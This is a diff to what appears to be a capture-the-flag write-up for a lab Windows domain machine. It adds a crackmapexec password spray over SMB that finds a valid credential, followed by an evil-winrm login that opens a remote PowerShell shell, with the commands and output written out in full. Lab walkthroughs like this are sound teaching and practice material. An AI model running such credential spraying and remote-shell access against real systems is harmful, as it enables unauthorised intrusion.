@@ -545,6 +545,35 @@ if __name__ == "__main__":
 [+] User: MEGACORP\pmartin                              
 [+] User: MEGACORP\Developers
 ```
+
+- Now when we check with `crackmapexec` we have a hit
+```
+└─$ crackmapexec smb 10.10.10.179 -u users.list -p passwords.list
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
+...
+```
+
+- And `tushikikatomo` has right to `winrm`
+```
+└─$ evil-winrm -u "MEGACORP\tushikikatomo" -p finance1 -i 10.10.10.179
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\alcibiades\Documents>
+```
 ## User
 
 
